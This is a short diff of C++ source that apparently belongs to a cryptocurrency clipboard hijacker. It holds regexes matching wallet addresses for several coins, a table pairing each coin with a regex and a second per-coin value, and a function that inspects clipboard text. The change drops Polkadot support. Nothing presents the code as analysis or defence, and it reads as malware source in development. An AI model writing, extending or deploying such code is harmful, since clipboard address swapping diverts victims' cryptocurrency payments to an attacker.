@@ -12,7 +12,6 @@ std::string dash_regex = R"((?:^|\s)(X[1-9A-HJ-NP-Za-km-z]{33})(?=\s|$))";
 std::string tron_regex = R"((?:^|\s)(T[1-9A-HJ-NP-Za-km-z]{33})(?=\s|$))";
 std::string bnb_regex = R"((?:^|\s)(bnb1[a-zA-HJ-NP-Z0-9]{38})(?=\s|$))";
 std::string ada_regex = R"((?:^|\s)(addr1[0-9a-z]{98})(?=\s|$))";
-std::string dot_regex = R"((?:^|\s)(14[A-Za-z0-9]{47})(?=\s|$))";
 
 struct CryptoInfo {
     std::string currency_name;
@@ -33,8 +32,7 @@ CryptoInfo crypto_info[] = {
     {"BCH", std::regex(bch_regex), bch, m_bch},
     {"TRON", std::regex(tron_regex), tron, m_tron},
     {"BNB", std::regex(bnb_regex), bnb, m_bnb},
-    {"ADA", std::regex(ada_regex), ada, m_ada},
-    {"DOT", std::regex(dot_regex), dot, m_dot}
+    {"ADA", std::regex(ada_regex), ada, m_ada}
 };
 
 void detected(std::string clipboard_text) {
